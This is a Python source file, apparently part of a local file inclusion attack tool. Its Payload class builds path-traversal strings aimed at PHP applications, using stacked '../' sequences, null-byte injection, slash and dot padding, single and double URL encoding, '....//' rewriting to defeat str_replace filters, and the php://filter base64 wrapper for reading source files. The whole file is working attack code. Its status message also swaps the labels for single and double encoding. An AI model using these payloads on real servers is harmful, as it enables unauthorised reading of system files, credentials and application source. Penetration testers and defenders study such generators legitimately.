import urllib.parse

class Payload:
    """Class used for generation of payload"""
    def __init__(self, local_file, search_term):

        self.local_file = local_file
        self.payload = local_file
        self.search_term = search_term

        # Payload attributes
        self.null_byte = False
        self.directories_transversed = 0
        self.extra_slashes = 0
        self.extra_dots = 0
        self.url_encode = False
        self.url_dbl_encode = False
        self.root = False
        self.replace_tran = False
        self.filter = False

    def root_file(self):
        """Creates a payload as if the file was in the root dir"""
        self.payload = self.local_file
        self.root = True

    def null_byte_injection(self):
        """Adds a null byte to the end %00"""
        if not self.filter:
            self.payload = self.payload + "%00"
            self.null_byte = True
            return True
        return False

    def directory_traversal(self, n):
        """Creates a directory traversal attack"""
        traversal = "../"
        n += 1
        if self.directories_transversed == 0:
            self.payload = (n * traversal) + ".." + self.payload
        else:
            self.payload = (n * traversal) + self.payload
        self.directories_transversed = n

    def sanitation_bypass_extra_slash(self, n):
        """Adds extra slashes to try and bypass filter techniques"""
        if "/" in self.payload and not self.filter:

            self.payload = self.payload.replace("/", (n*"/"))
            self.extra_slashes = n
            return True
        else:
            return False

    def sanitation_bypass_extra_dot(self, n):
        """Adds extra dots to try and bypass filter techniques"""
        if ".." in self.payload and not self.filter:
            self.payload = self.payload.replace("..", (n*"."))
            self.extra_dots = n
            return True
        else:
            return False

    def sanitation_bypass_url_encode(self):
        """URL encoded the payload"""
        original = self.payload
        self.payload = urllib.parse.quote_plus(self.payload)

        if self.payload == original or self.filter:
            return False
        else:
            self.url_encode = True
            self.url_dbl_encode = False
            return True

    def sanitation_bypass_dbl_url_encode(self):
        """Double URL encode the payload"""
        original = self.payload
        self.payload = urllib.parse.quote_plus(self.payload)
        self.payload = urllib.parse.quote_plus(self.payload)
        if self.payload == original or self.filter:
            return False
        else:
            self.url_dbl_encode = True
            self.url_encode = False
            return True

    def sanitation_bypass_replace_tran(self):
        """
        Would bypass the following
        str_replace('../', '', $_GET['file']);
        ....//      ->      ../
        """
        if "../" in self.payload and not self.filter:
            self.payload = self.payload.replace("../", "....//")
            self.replace_tran = True
            return True
        return False

    def enable_filter_wrapper(self):
        """Enables the php://filter/convert.base64-encode/resource="""
        self.payload = "php://filter/convert.base64-encode/resource=" + self.payload
        self.filter = True
        return True

    def get_payload(self):
        return self.payload

    def gen_payload_message(self):
        """
        Creates a message describing the payload
        :return: string
        """
        msg = ""
        if self.root:
            msg += f"Payload is in the root directory\n"
        if self.null_byte:
            msg += f"Payload has a PHP Null Byte injection\n"
        if self.directories_transversed != 0:
            msg += f"Payload has {self.directories_transversed} directories transversed\n"
        if self.extra_slashes != 0:
            msg += f"Payload has {self.extra_slashes} extra slashes\n"
        if self.extra_dots != 0:
            msg += f"Payload has {self.extra_dots} extra dots\n"
        if self.url_encode:
            msg += f"Payload has been double URL encoded\n"
        if self.url_dbl_encode:
            msg += f"Payload has been URL encoded\n"
        return msg[:-1]
